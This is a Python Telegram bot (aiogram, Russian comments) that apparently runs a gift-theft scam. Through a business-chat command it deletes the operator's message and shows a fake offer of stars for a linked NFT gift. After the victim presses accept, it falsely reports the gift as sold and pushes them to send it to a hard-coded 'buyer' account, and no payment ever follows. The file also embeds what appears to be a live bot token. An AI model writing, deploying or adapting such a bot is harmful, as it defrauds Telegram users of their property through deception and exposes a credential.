import asyncio
import logging
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "9102997587:AAE1pU9ylYf55Mu6BOrq_rrQ6VGh6EMKrtE"
BUYER_USERNAME = "Ver1tasX212"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Для бизнес-чатов используем business_message
@dp.business_message(Command("tora"))
async def cmd_tora_business(message: types.Message):
    args = message.text.split()
    if len(args) < 3:
        await message.answer("❌ Мало данных. Пример: /tora https://t.me/nft/Cake-123 500")
        return

    link = args[1]
    price = args[2]
    
    try:
        await message.delete() # Удаляем команду
    except:
        pass

    text = f"<a href='{link}'>{link}</a>\n\n" \
           f"Пользователь предлагает Вам <b>{price} ⭐</b> за подарок.\n\n" \
           f"<i>Предложение действует ещё 6ч 0.мин</i>"

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Отклонить", callback_data="reject"),
            InlineKeyboardButton(text="Принять", callback_data=f"accept|{price}|{link}")
        ]
    ])

    await message.answer(text=text, reply_markup=keyboard, parse_mode="HTML")

@dp.callback_query(F.data == "reject")
async def reject(callback: types.CallbackQuery):
    await callback.answer()
    try:
        await callback.message.delete()
    except:
        pass

@dp.callback_query(F.data.startswith("accept|"))
async def accept(callback: types.CallbackQuery):
    parts = callback.data.split("|")
    price = parts[1]
    link = parts[2]

    new_text = f"✅ Подарок был успешно продан {price} ⭐\n\n" \
               f"<a href='{link}'>{link}</a>\n\n" \
               f"Для завершения передайте свой подарок покупателю чтобы получить звёзды."

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Передать подарок", url=f"tg://send_gift?to={BUYER_USERNAME}")]
    ])

    await callback.message.edit_text(text=new_text, reply_markup=keyboard, parse_mode="HTML")
    await callback.answer()

async def main():
    print("Бот запущен на сервере!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
